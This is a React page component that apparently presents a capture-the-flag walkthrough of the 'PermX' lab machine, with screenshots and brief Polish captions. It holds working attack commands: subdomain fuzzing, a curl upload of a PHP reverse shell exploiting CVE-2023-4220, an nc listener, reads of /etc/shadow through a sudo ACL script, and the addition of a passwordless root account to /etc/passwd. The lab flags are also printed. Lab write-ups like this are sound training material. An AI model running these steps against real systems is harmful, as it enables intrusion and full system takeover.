import permx_start from '../../../assets/permx_start.png';
import permx_fuzzing from '../../../assets/permx_fuzzing.png';
import permx_lms from '../../../assets/permx_lms.png';
import permx_exploit from '../../../assets/permx_exploit.png';
import permx_files from '../../../assets/permx_files.png';
import permx_pass from '../../../assets/permx_pass.png';
import permx_user_pass from '../../../assets/permx_user_pass.png';
import permx_root from '../../../assets/permx_root.png';
import ExampleFrame from '../../exampleFrame/ExampleFrame';
import { Link } from 'react-router-dom';

const PermX = () =>{
    return(
        <section>
            <h1>Perm X</h1>
            <ExampleFrame screen={permx_start} />
            <div className='waring'>
                <p>ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -fw 18</p>
            </div>
            <ExampleFrame screen={permx_fuzzing}/>
            <ExampleFrame screen={permx_lms}/>

            <hr />
            <h2>Exploit</h2>
            <Link to='https://starlabs.sg/advisories/23/23-4220/'>CVE-2023-4220</Link>

            <ExampleFrame screen={permx_exploit} />
            <ExampleFrame screen={permx_files} />
            <div className='waring'>
                <p>curl -F 'bigUploadFile=@<span className='important'>revese_shell.php</span>' 'http://permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'</p>
            </div>
            <div className='waring'>
                <p>Wykorzystanie pliku revese_shell.php</p>
                <p>nc -lvnp 1234</p>
            </div>
            <ExampleFrame screen={permx_pass} />
            <ExampleFrame screen={permx_user_pass} />
            
            <p className='important'>b8f720cb92dd0bc7c2cc3b07c0e47963</p>

            <div className='waring'>
                <p>ln -s /etc/shadow /home/mtz/test1</p>
                <p>sudo /opt/acl.sh mtz rw /home/mtz/test1</p>
                <p>cat ./test1</p>
            </div>
            <div className='waring'>
                <p>ln -s /etc/passwd /home/mtz/test2</p>
                <p>sudo /opt/acl.sh mtz rw /home/mtz/test2</p>
                <p>echo "root3::0:0:root3:/root:/bin/bash" {`>>`} ./test</p>
                <p>su root3</p>
                <p><span className='important'>root@permx:/home/mtz:#</span></p>
            </div>
            <ExampleFrame screen={permx_root} />
            <p className='important'>0d4b5f5caf458242d2742fad9454dafe</p>
        </section>
    )
}

export default PermX;